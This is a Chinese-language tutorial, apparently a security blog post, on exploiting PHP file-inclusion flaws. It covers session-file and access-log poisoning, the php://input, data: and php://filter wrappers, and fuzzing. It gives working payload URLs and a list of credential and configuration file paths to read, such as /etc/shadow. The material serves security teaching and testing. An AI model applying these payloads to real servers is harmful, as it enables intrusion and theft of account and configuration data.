攻击方式


(1) php本地/远程文件包含

测试代码：

<?php    $filename  = $_GET['filename'];    include($filename);?>


本地文件包含：

通过目录遍历漏洞可以获取到系统中其他文件的内容：


远程文件包含：

php 远程文件包含需要将 allow_url_fopen 和 allow_url_include设置为ON，

将filename 参数值设置为远程的文件，也可以在系统内执行。



（2）session 文件包含


利用条件：session的存储位置可以获取。

1.通过phpinfo的信息可以获取到session的存储位置，获取到session.save_path为/var/lib/php/session：

2.通过猜测默认的session存放位置进行尝试。如linux下默认存储在/var/lib/php/session目录下：

session中的内容可以被控制，传入恶意代码。

例如：

<?phpsession_start();$name=$_GET['name'];$_SESSION["name"]=$name;?>

此php会将获取到的GET型name变量的值存入到session中。

访问

http://www.huasec.com/index.php?name=crhua

会在/var/lib/php/session目录下存储session的值。

session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。

所以session的文件名为sess_akp79gfiedh13ho11i6f3sm6s6

到服务器的/var/lib/php/session目录下查看果然存在此文件，内容为：

[root@kali session]# cat sess_akp79gfiedh13ho11i6f3sm6s6name|s:5:"crhua"

通过上面的分析，可以知道参数name传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过参数name写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。


访问

http://192.168.91.142:8080/fi.php?filename=<?php phpinfo();?>

后，会在/var/lib/php/session目录下存储session的值。

攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。



(3)文件包含利用日志文件getshell


Apache日志分为access.log与error.log，当我们请求一个url地址时，便会记录在access.log中，但如果访问一个不存在的页面，便会将这个页面写入access.log中。如访问URL:

http://www.huasec.com/<?php phpinfo(); ?>

则会将一句话写入到access.log中。


(4) 伪协议

① php://input

用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。

条件：

php <5.0 ，allow_url_include=Off 情况下也可以用

php > 5.0，只有在allow_url_fopen=On 时才能使用

http://www.huasec.com/file.php?file=php://input
POST:
<?php phpinfo(); ?>

② data协议

条件：

allow_url_include = on

php > 5.2

http://www.huasec.com/file.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==

③ php://filter

http://www.huasec.com/file.php?file=php://filter/read=covert.base64-encode/resource=../../config.php

漏洞挖掘


当我们看到url参数的值为路径，那么我们可以尝试fuzz,是否存在文件包含漏洞。

比如：

http://www.huasec.com/index.php?skin=/static/html/head.html&page=1

skin参数的值为路径，我们可以对其fuzz,一般我常用字典跑，这种lfi字典git上有很多。

常见的敏感信息路径有：

Windows

c:\boot.ini // 查看系统版本

Linux

/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件/proc/self/environ  web进程运行时候的环境变量
